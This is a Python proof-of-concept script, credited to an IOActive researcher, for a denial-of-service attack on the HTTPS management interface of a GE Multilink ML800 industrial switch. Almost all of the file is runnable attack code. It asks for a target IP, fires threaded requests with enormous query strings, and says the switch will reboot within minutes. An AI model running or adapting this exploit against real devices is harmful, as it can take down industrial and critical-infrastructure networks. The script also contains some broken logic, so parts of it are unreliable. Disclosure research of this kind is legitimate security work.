#! /usr/bin/env python
# Copyright 2014 Eireann Leverett
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.*)
# 
# File name Multilink-DOS.py
# written by eireann.leverett@ioactive.co.uk
# This is a proof of concept that a denial of service on the HTTPS
# management interface will consume resources causing the other interfaces
# (SNMP, TELNET, SSH, HTTP) to become unusable. If sustained such a denial
# of service eventually causes the switch to reboot. This PoC has been tested
# a GE ML800 Version: 4.2.1. It may or may not work without modification on
# other devices or firmwares in that product line.  

from requests import Session
import socket, Queue, threading, requests, time, sys, random
session = Session()

#Some variables for keeping track of each thread's responses
nonexcepts = 0
timeouts = 0
connections = 0
others = 0

# called by each thread to make a request
def get_url(q, url):
	try: 
		res = 1, session.get(url, headers=headers,verify=False,timeout=5)
	except KeyboardInterrupt:
		sys.exit()
	except requests.exceptions.Timeout:
		res = 2, sys.exc_info()[1]
	except requests.exceptions.ConnectionError:
		res = 3, sys.exc_info()[1]
	except:
		res = 3, sys.exc_info()[1]
	q.put(res)

def is_ipv4(ip):
	try:
		socket.inet_aton(ip)
		return True
	except socket.error,e:
		return False

#Get the target from the user
machine = raw_input("Please enter the IPv4 address of the switch: ")
if is_ipv4(machine):
	print "Thank you."
else:
	print "Please go read RFC 791 and then use a legitimate IPv4 address."
	sys.exit()

#set up some header and prep all the urls
headers = { 'User-Agent': 'Finely Waxed Moustaches', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'connection': 'keep-alive'}
urls = []
print 'Preparing Denial of Service'
for i in range(21):
	r = '11111'*1000000000
	url = 'https://'+machine+'/media/config.xml?nocache='+r
	urls.append(url)

#queue it all up
q = Queue.Queue()
print 'Executing Denial of Service'
for u in urls:
    t = threading.Thread(target=get_url, args = (q,u))
    t.daemon = True
    t.start()
    
print 'Completed Denial of Service analysing results...'
#Analyse results
while not q.empty():
	kind,s = q.get()
	if kind == 1:
		nonexcepts += 1
	elif kind == 2:
		timeouts += 1
	elif kind == 3:
		connections += 1
	elif kind == 4:
		others += 1

#Report out
print 'Timeouts/Connection Exceptions: '+str(timeouts)+'/'+str(connections)
print 'Sometime within the next 3 minutes the switch will reboot, watch it closely!'
